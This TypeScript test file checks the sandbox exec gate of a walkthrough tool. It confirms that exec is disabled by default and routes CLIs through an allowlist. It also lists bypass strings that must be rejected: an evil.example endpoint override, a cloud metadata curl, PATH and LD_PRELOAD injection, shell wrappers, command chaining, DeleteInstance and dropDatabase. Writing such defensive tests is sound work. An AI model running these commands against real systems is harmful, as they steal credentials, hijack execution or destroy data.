import { chmodSync, existsSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { createSandboxFactory, execDecision, PRESET_CONNECTORS, Redactor, renderWalkthrough, WalkthroughCore, type Sandbox } from "../src/core/index.js";
import { SB } from "./helpers.js";

/** Records what the sandbox was asked to spawn; never runs anything. */
function mk(allowExec?: boolean) {
  const root = mkdtempSync(join(tmpdir(), "wt-exec-"));
  const spawned: unknown[] = [];
  const sandbox: Sandbox = { up: async () => ({ exitCode: 0, output: "" }), down: async () => ({ exitCode: 0, output: "" }), logs: async () => "",
    exec: async (c) => { spawned.push(c); return { exitCode: 0, output: "ran" }; } };
  // Fake CLIs (record their argv) so routing through run_cli is observable without real credentials.
  const bin = join(root, "bin");
  const fake = (name: string) => { const p = join(root, `fake-${name}`); writeFileSync(p, `#!/usr/bin/env node
if(process.argv[2]==="--version"){console.log("9.9.9");process.exit(0)}
require("fs").appendFileSync(${JSON.stringify(join(root, "calls.jsonl"))},JSON.stringify([${JSON.stringify(name)},...process.argv.slice(2)])+"\\n");console.log("ok");`); chmodSync(p, 0o755); return p; };
  void bin;
  const connectors = PRESET_CONNECTORS.map((c) => ({ ...c, binary: fake(c.name) }));
  const core = new WalkthroughCore({ root, sandboxFactory: () => sandbox, capturer: { screenshot: async () => undefined }, redactor: new Redactor([]), connectors });
  const cliCalls = () => existsSync(join(root, "calls.jsonl")) ? readFileSync(join(root, "calls.jsonl"), "utf8").trim().split("\n").map((l) => JSON.parse(l)) : [];
  const id = core.startWalkthrough({ title: "t", sandbox: { ...SB, ...(allowExec === undefined ? {} : { allowExec }) } }).id;
  return { core, id, spawned, cliCalls };
}

describe("run_in_sandbox exec (issue #8)", () => {
  it("is disabled by default (and with allowExec: false)", async () => {
    for (const flag of [undefined, false]) {
      const { core, id, spawned } = mk(flag);
      await expect(core.runInSandbox(id, "exec", "echo hi")).rejects.toThrow(/exec is disabled.*allowExec: true/);
      await expect(core.runInSandbox(id, "exec", "aliyun sls GetLogs --project p")).rejects.toThrow(/exec is disabled/);
      expect(spawned).toEqual([]);
      expect(readFileSync(renderWalkthrough(core, id), "utf8")).not.toContain("沙箱任意命令已开启");
    }
  });

  it("bypass attempts are rejected even when exec is enabled; nothing is spawned", async () => {
    const { core, id, spawned, cliCalls } = mk(true);
    const bad: [string, RegExp][] = [
      ["aliyun sls GetLogs --project p --endpoint http://evil.example --insecure", /argument not in allowlist|flag not allowed/],
      ["aliyun ecs DeleteInstance --InstanceId i-1", /not in whitelist/],
      ["/usr/bin/aliyun sls GetLogs --project p", /looks like aliyun/],
      ["./aliyun sls GetLogs --project p", /looks like aliyun/],
      ["ALIYUN sls GetLogs --project p", /looks like aliyun/],
      ["aliyun.exe sls GetLogs", /looks like aliyun/],
      ["sh -c 'aliyun sls GetLogs'", /shell\/wrapper/],
      ["bash -c id", /shell\/wrapper/],
      ["/bin/sh -c id", /shell\/wrapper/],
      ["env aliyun sls GetLogs", /shell\/wrapper/],
      ["sudo aliyun sls GetLogs", /shell\/wrapper/],
      ["xargs aliyun", /shell\/wrapper/],
      ["timeout 5 aliyun sls GetLogs", /shell\/wrapper/],
      ["ALIBABA_CLOUD_ACCESS_KEY_ID=x aliyun sls GetLogs", /env assignments are not allowed/],
      ["PATH=/tmp/evil aliyun sls GetLogs", /env assignments are not allowed/],
      ["PATH=/tmp/evil node x.js", /env assignments \(PATH\) are not allowed/],
      ["LD_PRELOAD=/tmp/x.so node x.js", /env assignments \(LD_PRELOAD\) are not allowed/], ["FOO=1 node x.js", /env assignments/],
      ["node wrapper.js aliyun sls GetLogs", /names a credentialed CLI/],
      ["python3 run.py /usr/local/bin/mqadmin topicList", /names a credentialed CLI/],
      ["mongosh mongodb://h/db --eval 'db.dropDatabase()'", /query template/],
      ["mongo --eval x", /no run_cli connector/],
      ["mqadmin updateTopic -n ns -t t", /not in whitelist/],
      ["kubectl get pods", /no run_cli connector/],
      ["curl http://169.254.169.254/", /no run_cli connector/],
      ["echo hi; aliyun sls GetLogs", /metacharacter/],
      ["echo $(aliyun)", /metacharacter/],
      ["echo hi | aliyun", /metacharacter/],
    ];
    for (const [cmd, re] of bad) { const r = await core.runInSandbox(id, "exec", cmd).then((x) => `RESOLVED ${cmd}`, (e) => String(e.message)); expect(r, cmd).toMatch(re); }
    expect(spawned).toEqual([]);
    expect(cliCalls()).toEqual([]);
  });

  it("a known CLI in exec is routed through run_cli's allowlist (never spawned by exec); others spawn as argv", async () => {
    const { core, id, spawned, cliCalls } = mk(true);
    const routed = await core.runInSandbox(id, "exec", "mqadmin topicList -n ns:9876");
    expect(routed.via).toBe("run_cli");
    expect(routed.output).toMatch(/routed to run_cli \(mqadmin\)/);
    expect(spawned).toEqual([]);
    expect(cliCalls()).toEqual([["mqadmin", "topicList", "-n", "ns:9876"]]);
    const run = await core.runInSandbox(id, "exec", "node -e 'console.log(1)'");
    expect(run.via).toBe("exec");
    expect(spawned).toEqual([["node", "-e", "console.log(1)"]]); // argv array: no shell
    expect(core.verifyCommandLog(id).error).toBeUndefined();
    const log = readFileSync(join(core.dir(id), "commands.jsonl"), "utf8");
    expect(log).toMatch(/"type":"sandbox_exec"/);
  });

  it("enabled flag shows a red warning on the report and sign-off area, listing every exec", async () => {
    const { core, id } = mk(true);
    let html = readFileSync(renderWalkthrough(core, id), "utf8");
    expect(html).toMatch(/<div class="exec-enabled" data-exec-runs="0">⚠ 沙箱任意命令已开启/);
    await core.runInSandbox(id, "exec", "node -v");
    html = readFileSync(renderWalkthrough(core, id), "utf8");
    expect(html).toMatch(/data-exec-runs="1">⚠ 沙箱任意命令已开启[\s\S]*<code>node -v<\/code>/);
    const signoff = html.slice(html.indexOf('<div class="signoff"'));
    expect(signoff).toMatch(/class="exec-enabled signoff-warn">⚠ 沙箱任意命令已开启/);
    expect(html).toMatch(/\.exec-enabled\{background:#cf222e/);
  });

  it("real local sandbox: exec spawns without a shell", async () => {
    const root = mkdtempSync(join(tmpdir(), "wt-exec-real-"));
    const core = new WalkthroughCore({ root, sandboxFactory: createSandboxFactory(), capturer: { screenshot: async () => undefined }, redactor: new Redactor([]) });
    const id = core.startWalkthrough({ title: "t", sandbox: { backend: "local", cwd: root, up: "", down: "", allowExec: true, local: { up: "node -e 0" } } }).id;
    const r = await core.runInSandbox(id, "exec", `node -e "process.stdout.write(process.argv.slice(1).join('+'))" 'a b' "c;d|e"`);
    expect(r.output).toBe("a b+c;d|e"); // quoted metacharacters stay literal: no shell ever sees them
  });

  it("execDecision: unit", () => {
    expect(execDecision("node -v", {})).toEqual({ kind: "run", file: "node", args: ["-v"] });
    expect(execDecision("aliyun sls ListProject", {})).toMatchObject({ kind: "route", argv: ["sls", "ListProject"] });
  });
});
